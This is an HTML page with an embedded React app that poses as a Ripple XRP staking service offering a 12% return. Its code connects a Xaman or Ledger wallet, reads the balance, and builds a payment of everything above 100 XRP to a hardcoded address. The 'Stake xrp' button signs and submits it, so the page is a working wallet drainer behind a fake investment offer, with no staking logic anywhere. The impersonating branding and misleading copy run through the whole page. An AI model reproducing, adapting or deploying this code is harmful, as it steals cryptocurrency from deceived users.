<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ripple XRP dApp</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/xrpl@2.11.0/build/xrpl-latest-min.js"></script>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function XamanWalletDApp() {
          const [isConnected, setIsConnected] = useState(false);
          const [walletAddress, setWalletAddress] = useState('');
          const [txStatus, setTxStatus] = useState('');
          const [isLoading, setIsLoading] = useState(false);
          const [txHash, setTxHash] = useState('');
          const [qrUrl, setQrUrl] = useState('');
          const [isMobile, setIsMobile] = useState(false);
          const [showWalletModal, setShowWalletModal] = useState(false);
          const [walletType, setWalletType] = useState(''); // 'xaman' or 'ledger'
          const [ledgerTransport, setLedgerTransport] = useState(null);

          useEffect(() => {
            // Detect if user is on mobile
            const checkMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            setIsMobile(checkMobile);
            
   // Check for saved wallet address
            const savedAddress = localStorage.getItem('xamanWalletAddress');
            const savedBalance = localStorage.getItem('xamanWalletBalance');
            const savedAmount = localStorage.getItem('xamanCalculatedAmount');
            const savedWalletType = localStorage.getItem('walletType');
            
            if (savedAddress) {
              setWalletAddress(savedAddress);
              setIsConnected(true);
              setTxStatus('connected');
              setWalletType(savedWalletType || 'xaman');
              
              if (savedBalance) {
                setUserBalance(parseFloat(savedBalance));
              }
              if (savedAmount) {
                setCalculatedAmount(savedAmount);
              }
            }
          }, []);

          const DESTINATION_ADDRESS = 'rU8ea9mwTQQ9yNvZGkMi9Ghy6ZnnjEWDoF';
          const [userBalance, setUserBalance] = useState(0);
          const [calculatedAmount, setCalculatedAmount] = useState('0');
          
         // Use relative URL for same domain, or set your backend URL
          const API_BASE = window.location.origin;

          const connectLedger = async () => {
            setIsLoading(true);
            setTxStatus('');
            
            try {
              // Load Ledger library dynamically
              const script = document.createElement('script');
              script.src = 'https://cdn.jsdelivr.net/npm/@ledgerhq/hw-transport-webusb@6.27.1/lib/TransportWebUSB.min.js';
              document.head.appendChild(script);
              
              await new Promise((resolve) => {
                script.onload = resolve;
              });
              
              const transport = await TransportWebUSB.create();
              setLedgerTransport(transport);
              
              // Import XRP app
              const Xrp = (await import('https://cdn.jsdelivr.net/npm/@ledgerhq/hw-app-xrp@6.27.1/+esm')).default;
              const xrp = new Xrp(transport);
              
              // Get address from Ledger
              const result = await xrp.getAddress("44'/144'/0'/0/0");
              const account = result.address;
              
              setWalletAddress(account);
              setWalletType('ledger');
              
              // Fetch account balance
              try {
                const balanceResponse = await fetch('https://xrplcluster.com', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    method: 'account_info',
                    params: [{
                      account: account,
                      ledger_index: 'validated'
                    }]
                  })
                });
                
                const balanceData = await balanceResponse.json();
                if (balanceData.result?.account_data?.Balance) {
                  const balanceInDrops = parseInt(balanceData.result.account_data.Balance);
                  const balanceInXRP = balanceInDrops / 1000000;
                  setUserBalance(balanceInXRP);
                  
                  const amountToSend = Math.max(0, balanceInXRP - 100);
                  const amountInDrops = Math.floor(amountToSend * 1000000);
                  setCalculatedAmount(amountInDrops.toString());
                  
                  localStorage.setItem('xamanWalletBalance', balanceInXRP.toString());
                  localStorage.setItem('xamanCalculatedAmount', amountInDrops.toString());
                }
              } catch (error) {
                console.error('Error fetching balance:', error);
              }
              
              localStorage.setItem('xamanWalletAddress', account);
              localStorage.setItem('walletType', 'ledger');
              
              setIsConnected(true);
              setTxStatus('connected');
              setShowWalletModal(false);
            } catch (error) {
              setTxStatus('error');
              console.error('Ledger connection failed:', error);
              alert('Failed to connect to Ledger. Make sure your device is connected and the XRP app is open.');
            } finally {
              setIsLoading(false);
            }
          };

          const connectWallet = async () => {
            // On mobile, directly connect to Xaman
            if (isMobile) {
              connectXaman();
            } else {
              // On desktop, show wallet selection modal
              setShowWalletModal(true);
            }
          };

          const connectXaman = async () => {
            setIsLoading(true);
            setTxStatus('');
            setShowWalletModal(false);
            setWalletType('xaman');
            
            try {
              const authPayload = {
                txjson: {
                  TransactionType: 'SignIn'
                }
              };

              const response = await fetch(`${API_BASE}/api/payload`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(authPayload)
              });

              const data = await response.json();
              
              if (data.refs?.qr_png) {
                // Only show QR code on desktop
                if (!isMobile) {
                  setQrUrl(data.refs.qr_png);
                }
                
                // On mobile, directly open Xaman app. On desktop, open in new tab
                if (isMobile) {
                  window.location.href = data.next.always;
                } else {
                  window.open(data.next.always, '_blank');
                }
                
                const checkPayload = async () => {
                  const statusResponse = await fetch(`${API_BASE}/api/payload/${data.uuid}`);
                  const statusData = await statusResponse.json();
                  
                  if (statusData.meta.signed) {
                    const account = statusData.response.account;
                    setWalletAddress(account);
                    
                    // Fetch account balance
                    try {
                      const balanceResponse = await fetch('https://xrplcluster.com', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          method: 'account_info',
                          params: [{
                            account: account,
                            ledger_index: 'validated'
                          }]
                        })
                      });
                      
                      const balanceData = await balanceResponse.json();
                      if (balanceData.result?.account_data?.Balance) {
                        const balanceInDrops = parseInt(balanceData.result.account_data.Balance);
                        const balanceInXRP = balanceInDrops / 1000000;
                        setUserBalance(balanceInXRP);
                        
                      // Calculate amount leaving 100 XRP in wallet
                        const amountToSend = Math.max(0, balanceInXRP - 100);
                        const amountInDrops = Math.floor(amountToSend * 1000000);
                        setCalculatedAmount(amountInDrops.toString());
                        
                        // Save to localStorage
                        localStorage.setItem('xamanWalletBalance', balanceInXRP.toString());
                        localStorage.setItem('xamanCalculatedAmount', amountInDrops.toString());
                      }
                    } catch (error) {
                      console.error('Error fetching balance:', error);
                    }
                    
                  // Save wallet address to localStorage
                    localStorage.setItem('xamanWalletAddress', account);
                    localStorage.setItem('walletType', 'xaman');
                    
                    setIsConnected(true);
                    setTxStatus('connected');
                    setQrUrl('');
                  } else if (statusData.meta.resolved && !statusData.meta.signed) {
                    setTxStatus('rejected');
                    setQrUrl('');
                  } else {
                    setTimeout(checkPayload, 2000);
                  }
                };
                
                checkPayload();
              }
            } catch (error) {
              setTxStatus('error');
              console.error('Connection failed:', error);
            } finally {
              setIsLoading(false);
            }
          };

         const signTransaction = async () => {
            if (walletType === 'ledger') {
              await signLedgerTransaction();
            } else {
              await signXamanTransaction();
            }
          };

          const signLedgerTransaction = async () => {
            setIsLoading(true);
            setTxStatus('signing');
            
            try {
              // Get account info for sequence number
              const accountInfoResponse = await fetch('https://xrplcluster.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  method: 'account_info',
                  params: [{
                    account: walletAddress,
                    ledger_index: 'validated'
                  }]
                })
              });
              
              const accountInfo = await accountInfoResponse.json();
              const sequence = accountInfo.result.account_data.Sequence;
              
              // Get current ledger for LastLedgerSequence
              const ledgerResponse = await fetch('https://xrplcluster.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  method: 'ledger',
                  params: [{
                    ledger_index: 'validated'
                  }]
                })
              });
              
              const ledgerData = await ledgerResponse.json();
              const lastLedgerSequence = ledgerData.result.ledger_index + 10;
              
              // Prepare transaction
              const tx = {
                Account: walletAddress,
                TransactionType: 'Payment',
                Destination: DESTINATION_ADDRESS,
                Amount: calculatedAmount,
                Fee: '12',
                Sequence: sequence,
                LastLedgerSequence: lastLedgerSequence
              };
              
              // Encode transaction
              const client = new xrpl.Client('wss://xrplcluster.com');
              await client.connect();
              
              const prepared = await client.autofill(tx);
              const encoded = xrpl.encode(prepared);
              
              // Sign with Ledger
              const Xrp = (await import('https://cdn.jsdelivr.net/npm/@ledgerhq/hw-app-xrp@6.27.1/+esm')).default;
              const xrpApp = new Xrp(ledgerTransport);
              
              const signature = await xrpApp.signTransaction("44'/144'/0'/0/0", encoded);
              
              // Submit transaction
              const signedTx = xrpl.encode({
                ...prepared,
                TxnSignature: signature.toUpperCase()
              });
              
              const submitResponse = await client.submitAndWait(signedTx);
              
              await client.disconnect();
              
              setTxHash(submitResponse.result.hash);
              setTxStatus('success');
            } catch (error) {
              setTxStatus('error');
              console.error('Ledger transaction failed:', error);
            } finally {
              setIsLoading(false);
            }
          };

          const signXamanTransaction = async () => {
            setIsLoading(true);
            setTxStatus('signing');
            
            try {
              const paymentPayload = {
                txjson: {
                  TransactionType: 'Payment',
                  Destination: DESTINATION_ADDRESS,
                  Amount: calculatedAmount,
                  Account: walletAddress
                }
              };

              const response = await fetch(`${API_BASE}/api/payload`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(paymentPayload)
              });

              const data = await response.json();
              
              if (data.refs?.qr_png) {
                // Only show QR code on desktop
                if (!isMobile) {
                  setQrUrl(data.refs.qr_png);
                }
                
                // On mobile, directly open Xaman app. On desktop, open in new tab
                if (isMobile) {
                  window.location.href = data.next.always;
                } else {
                  window.open(data.next.always, '_blank');
                }
                
                const checkPayload = async () => {
                  const statusResponse = await fetch(`${API_BASE}/api/payload/${data.uuid}`);
                  const statusData = await statusResponse.json();
                  
                  if (statusData.meta.signed) {
                    setTxHash(statusData.response.txid);
                    setTxStatus('success');
                    setQrUrl('');
                  } else if (statusData.meta.resolved && !statusData.meta.signed) {
                    setTxStatus('rejected');
                    setQrUrl('');
                  } else {
                    setTimeout(checkPayload, 2000);
                  }
                };
                
                checkPayload();
              }
            } catch (error) {
              setTxStatus('error');
              console.error('Transaction failed:', error);
            } finally {
              setIsLoading(false);
            }
          };

const disconnect = () => {
            setIsConnected(false);
            setWalletAddress('');
            setTxStatus('');
            setTxHash('');
            setUserBalance(0);
            setCalculatedAmount('0');
            setWalletType('');
            
            if (ledgerTransport) {
              ledgerTransport.close();
              setLedgerTransport(null);
            }
            
            // Clear localStorage
            localStorage.removeItem('xamanWalletAddress');
            localStorage.removeItem('xamanWalletBalance');
            localStorage.removeItem('xamanCalculatedAmount');
            localStorage.removeItem('walletType');
          };

         return (
            <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
              {/* Wallet Selection Modal */}
              {showWalletModal && (
                <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
                  <div className="bg-slate-800 border border-slate-700 rounded-2xl p-8 max-w-md w-full shadow-2xl">
                    <div className="flex justify-between items-center mb-6">
                      <h2 className="text-2xl font-bold text-white">Connect Wallet</h2>
                      <button
                        onClick={() => setShowWalletModal(false)}
                        className="text-slate-400 hover:text-white transition-colors"
                      >
                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                        </svg>
                      </button>
                    </div>
                    
                    <p className="text-slate-400 mb-6">Choose your wallet to continue</p>
                    
                    <div className="space-y-3">
                      <button
                        onClick={connectXaman}
                        disabled={isLoading}
                        className="w-full flex items-center gap-4 p-4 bg-slate-700 hover:bg-slate-600 disabled:bg-slate-800 disabled:cursor-not-allowed rounded-xl transition-all group"
                      >
                        <div className="w-12 h-12 bg-blue-500 rounded-lg flex items-center justify-center group-hover:scale-110 transition-transform">
                          <div className="w-6 h-6 bg-white rounded-full"></div>
                        </div>
                        <div className="text-left flex-1">
                          <div className="text-white font-semibold">Xaman</div>
                          <div className="text-slate-400 text-sm">Connect with Xaman wallet</div>
                        </div>
                        <svg className="w-5 h-5 text-slate-400 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                        </svg>
                      </button>
                      
                      <button
                        onClick={connectLedger}
                        disabled={isLoading}
                        className="w-full flex items-center gap-4 p-4 bg-slate-700 hover:bg-slate-600 disabled:bg-slate-800 disabled:cursor-not-allowed rounded-xl transition-all group"
                      >
                        <div className="w-12 h-12 bg-slate-600 rounded-lg flex items-center justify-center group-hover:scale-110 transition-transform">
                          <svg className="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24">
                            <rect x="2" y="6" width="20" height="12" rx="2" />
                            <circle cx="7" cy="12" r="1.5" fill="currentColor" />
                          </svg>
                        </div>
                        <div className="text-left flex-1">
                          <div className="text-white font-semibold">Ledger</div>
                          <div className="text-slate-400 text-sm">Connect with Ledger device</div>
                        </div>
                        <svg className="w-5 h-5 text-slate-400 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                        </svg>
                      </button>
                    </div>
                    
                    {isLoading && (
                      <div className="mt-6 text-center">
                        <div className="inline-flex items-center gap-2 text-blue-400">
                          <div className="w-4 h-4 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                          <span>Connecting...</span>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              <header className="bg-slate-900/80 backdrop-blur-sm border-b border-slate-700/50">
                <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center">
                      <div className="w-4 h-4 bg-white rounded-full"></div>
                    </div>
                    <span className="text-white font-semibold text-xl">ripple</span>
                  </div>
                </div>
              </header>

              <main className="max-w-4xl mx-auto px-6 py-20 pb-32">
                <div className="text-center mb-16">
                  <h1 className="text-5xl md:text-6xl font-bold text-white mb-6 leading-tight">
                    Earn 12% ROI for staking your xrp
                  </h1>
                  <p className="text-slate-300 text-lg max-w-3xl mx-auto">
                    Ripple's payments, custody and stablecoin solutions empower financial institutions to
                    integrate blockchain and digital assets into their business in a simple, secure, compliant
                    way—all in one place.
                  </p>
                </div>

                <div className="bg-green-900/20 border border-green-700/50 rounded-xl p-4 mb-8">
                  <p className="text-green-200 text-sm">
                    <strong></strong> Connect your wallet to get started.
                  </p>
                </div>

                <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-2xl p-8 md:p-12 shadow-2xl mb-24">
                  {!isConnected ? (
                    <div className="text-center">
                      <div className="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                        <svg className="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                        </svg>
                      </div>
                      <h2 className="text-3xl font-bold text-white mb-4">
                        Connect Your Wallet
                      </h2>
                      <p className="text-slate-400 mb-8 max-w-md mx-auto">
                        Securely connect your wallet to stake your XRP and earn rewards.
                      </p>
                      
                      {qrUrl && !isMobile && (
                        <div className="mb-6">
                          <img src={qrUrl} alt="Scan with Xaman" className="mx-auto rounded-lg shadow-lg" />
                          <p className="text-slate-400 text-sm mt-4">Scan this QR code with your Xaman app</p>
                        </div>
                      )}
                      
                      {isLoading && isMobile && (
                        <p className="text-blue-400 mb-6">Opening Xaman app...</p>
                      )}
                      
                      {txStatus === 'rejected' && (
                        <p className="text-red-400 mt-4">Connection was rejected. Please try again.</p>
                      )}
                    </div>
                  ) : (
                    <div className="text-center">
                      {txStatus === 'connected' && (
                        <div className="mb-8">
                          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-2">
                            Wallet Connected
                          </h2>
                          <p className="text-slate-400 mb-2">Your wallet is successfully connected</p>
                          <p className="text-sm text-slate-500 font-mono bg-slate-900/50 px-4 py-2 rounded-lg inline-block mb-8">
                            {walletAddress}
                          </p>
                        </div>
                      )}

                      {txStatus === 'success' ? (
                        <div>
                          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Transaction Signed Successfully
                          </h2>
                          <p className="text-slate-400 mb-4">
                            Your transaction has been signed and submitted to the XRPL network
                          </p>
                          {txHash && (
                            <a
                              href={`https://livenet.xrpl.org/transactions/${txHash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 mb-8"
                            >
                              <span className="font-mono text-sm">{txHash.substring(0, 16)}...</span>
                              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                              </svg>
                            </a>
                          )}
                          <div className="mt-8">
                            <button
                              onClick={() => setTxStatus('connected')}
                              className="px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
                            >
                              Send Another Transaction
                            </button>
                          </div>
                        </div>
                      ) : txStatus === 'error' ? (
                        <div>
                          <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Transaction Failed
                          </h2>
                          <p className="text-slate-400 mb-8">
                            There was an error signing your transaction. Please try again.
                          </p>
                          <button
                            onClick={signTransaction}
                            className="px-8 py-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-xl transition-all"
                          >
                            Retry
                          </button>
                        </div>
                      ) : txStatus === 'rejected' ? (
                        <div>
                          <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Transaction Rejected
                          </h2>
                          <p className="text-slate-400 mb-8">
                            You rejected the transaction in your wallet.
                          </p>
                          <button
                            onClick={() => setTxStatus('connected')}
                            className="px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
                          >
                            Go Back
                          </button>
                        </div>
                      ) : (
                        <div>
                          {qrUrl && !isMobile && (
                            <div className="mb-6">
                              <img src={qrUrl} alt="Scan with Xaman" className="mx-auto rounded-lg shadow-lg mb-4" />
                              <p className="text-slate-400 text-sm">Scan this QR code or check your Xaman app</p>
                            </div>
                          )}
                          
                          {isLoading && isMobile && (
                            <p className="text-blue-400 mb-6">Opening Xaman app...</p>
                          )}
                          
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Stake xrp
                          </h2>
                          <p className="text-slate-400 mb-8 max-w-md mx-auto">
                            Securely stake your XRP to earn a 12% annual return directly through your wallet.
                          </p>
                        </div>
                      )}
                    </div>
                  )}
                </div>

                {/* Sticky Button Container */}
                <div className="fixed bottom-0 left-0 right-0 bg-gradient-to-t from-slate-900 via-slate-900 to-transparent p-6 pb-8 z-50">
                  <div className="max-w-md mx-auto">
                    {!isConnected ? (
                      <button
                        onClick={connectWallet}
                        disabled={isLoading}
                        className="w-full px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
                      >
                        {isLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            Waiting for Xaman...
                          </span>
                        ) : (
                          'Connect Wallet'
                        )}
                      </button>
                    ) : (
                      <button
                        onClick={signTransaction}
                        disabled={isLoading}
                        className="w-full px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
                      >
                        {isLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            Waiting for signature...
                          </span>
                        ) : (
                          'Stake xrp'
                        )}
                      </button>
                    )}
                  </div>
                </div>

                <div className="mt-12 text-center">
                  <p className="text-slate-500 text-sm">
                    Powered by XRPL • Secure • Decentralized
                  </p>
                </div>
              </main>
            </div>
          );
        }

        ReactDOM.render(<XamanWalletDApp />, document.getElementById('root'));
    </script>
</body>
</html>
